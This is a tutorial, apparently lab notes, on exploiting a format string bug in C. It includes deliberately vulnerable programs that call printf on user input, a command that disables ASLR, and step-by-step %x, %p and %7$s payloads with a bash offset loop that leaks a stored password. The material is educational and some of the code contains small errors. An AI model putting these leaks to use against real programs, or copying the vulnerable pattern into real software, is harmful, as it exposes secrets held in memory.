# Dumping Sensitive Data

**vuln01.c**

```c
#include<stdio.h>
#include<string.h>
#include<stdlib.h>

void main(){
        char buffer[512];
        char password[] = "Nz!Tvq4s!Q5ttx1se"; // password = My Sup3r P4ssw0rd
        for(char* c = password ; *c ; ++c)
                *c -= 1;
        printf("Insert password: ");
        gets(buffer,sizeof(buffer),stdin);
        printf("Validating password: ");
        printf(buffer); // vulnerable
        if(!strcmp(buffer,password))
                printf("\n[+] Access granted\n");
        else
                printf("\n[-] Access denied to pwd = %s\n",buffer);
}
```

**Compilation**

```
gcc vuln01.c -o vuln01
```

- Disable ASRL using : 

```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

- The code is using Caesar Cipher with key as 1.
- The code is such that one can dump the password from the memory using format string
- Securely storing the password is not the aim

## What is a format string?

- A format string is composed of ordinary characters and conversion specifiers
- Ordinary characters are those copied unchanged to the output stream
- Whereas conversion specifiers, identified by `%` characters will specify a data type, which will tell the printf function how to retrieve data from the stack
- Looking at the second printf

```c
printf("\n[-] Access denied to pwd = %s\n",buffer);
```

- The buffer string pointer will be pushed to the stack
- Then the pointer to the string, the first parameter, will be pushed to stack as well right before the call to printf
- The printf function will read whatever is given as the first parameter and read the stack as it finds conversion specifiers.


### Varying Length Function

```c
int printf(const char *format, ...);
```

- This is the varying length function
- You find it once and will accommodate any number of parameter
- A varying length parameter is defined as follows

**varlen.c**

```c
#include <stdio.h>
#include <stdarg.h>

int min(int count, ...)
{
        int min, next_arg;

        va_list ap;
        va_start(ap, count);
        min = va_arg(ap, int);

        for (int i = 2; i <= count; i++)
                if ((next_arg = va_arg(ap, int)) < min)
                        min = next_arg;

        va_end(ap);
        return min;
}

int main()
{
        int count = 3;
        printf("Min value is %d\n", min(count, 78, 700, 35));
        return 0;
}
```

- Here we have a function `min()` which will accept any number of integers and will return the smallest one.
- Relevant piece code is : 

```c
if ((next_arg = va_arg(ap, int)) < min)
```

- Here `va_arg` macro tells how to increment the pointer to the stack in order for it to fetch the next argument.
- The programmers must tell function, how many parameters it has to fetch from the stack
- If we tell the function to fetch more variables than we put up in stack, it will keep reading stack
- This is the problem with printf. 
- While it doesn't have the count number in its first parameter 
- What it has is strings with conversion specifiers
- If we just place more of those, then it will just printing out from the stack 
- To exploit this, one must have control over the first parameter string

## Exploiting the printf in vuln01 code

- Giving `%x` as an input will give the next 4 bytes in the stack as an hexadecimal number

```
./vuln01 
Insert password: %x
Validating password: 7694201a
[-] Access denied to pwd = %x
```

```
./vuln01 
Insert password: %x %x
Validating password: b431901a 0
[-] Access denied to pwd = %x %x
```

- We can use python to print multiple `%x`
- Giving multiple format strings will print more values from the stack

![](Format%20String%20Exploit/Pictures/printing_from_stack.png)

- Running the binary in gdb
- Put a breakpoint at the vulnerable printf

![](Format%20String%20Exploit/Pictures/bp_at_vuln_print.png)

![](Format%20String%20Exploit/Pictures/passw_in_stack.png)

- Taking a look at the previous values dumped from the stack using the format string `%p` we find that the password is dumped

```
0x723370755320794d  0x7230777373345020
```

- Using `%c` format specifier, we won't be able to see the password in our dump
- `%c` grabs 4 bytes from the stack
- It takes 4 bytes from the stack, printing out just the lowest byte. Therefore, we will see only the numbers in the password

- In order to read it with `%s` there would have to be a pointer to that string
- Change the code, so that you have the pointer to the actual string in the stack instead of the value

**vuln02.c**

```c
#include<stdio.h>
#include<string.h>
#include<stdlib.h>

char password[] = "Nz!Tvq4s!Q5ttx1se"; // password = My Sup3r P4ssw0rd

void main(){
        char buffer[512];
		char* decode = password; //just to store the pointer to the stack
        for(char* c = password ; *c ; ++c)
                *c -= 1;
        printf("Insert password: ");
        gets(buffer,sizeof(buffer),stdin);
        printf("Validating password: ");
        printf(buffer); // vulnerable
        if(!strcmp(buffer,password))
                printf("\n[+] Access granted\n");
        else
                printf("\n[-] Access denied to pwd = %s\n",buffer);
}
```

- Use the same technique as before but with %s

**asd.py**

```py
buff = " %s " *20
print(buff)
```

```
python3 asd.py > x && cat x | ./vuln01 
Segmentation fault (core dumped)
```

- We get a segmentation fault, as we are trying to illegally access a page in the memory
- Taking a look at the dump with `%x` we see that

```
python3 -c 'print(" %x "*20)' | ./vuln01 
Insert password: Validating password:  9f09e01a  0  0  b5b735d0  15  b5b737a0  b5b735c1  5320794d  73345020  60f60064  0  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520 
[-] Access denied to pwd =  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x 
```

- The first leaked address is `9f09e01a` which is not a valid address, that is why we get a segmentation fault

### Direct Parameter Access (DPA)

- To overcome the above problem, we use direct parameter access

**dpa.c**

```c
#include<stdio.h>
void main() {
int x = 1, y = 2;
printf("%d %d %d\n",x,y,x);
}
```

- It is a very useful feature from implementation in libc
- If you're accessing the same value multiple times, you have to repeatedly put that value in memory.
- But using direct parameter access you don't have to

```
./dpa 
1 2 1
```

- Now update the code as follows

```c
#include<stdio.h>
void main() {
int x = 1, y = 2;
printf("%d %d %1$d\n",x,y);
}
```

```
./dpa 
1 2 1
```

- We get the same output
- Using this we can cyclic through all the positions 
- If it crashes, it is an iteration that goes out the window

```bash
for((i=1;i<1000;i++)); do echo -n "$i " && echo "%$i\$s" | ./vuln02; done | less
```

![](Format%20String%20Exploit/Pictures/vuln02_pw_leaked.png)

- We see that at number 7 the password is being displayed
- We can use the direct parameter access of our python script to leak the password

```py
buff = " %7$s "
print(buff)
```

- This will directly access the relevant string pointer

```
python3 asd.py > x && cat x | ./vuln02 
Insert password: Validating password:  My Sup3r P4ssw0rd 
[-] Access denied to pwd =  %7$s
```

- This is also useful, if you have buffer size restrictions in play

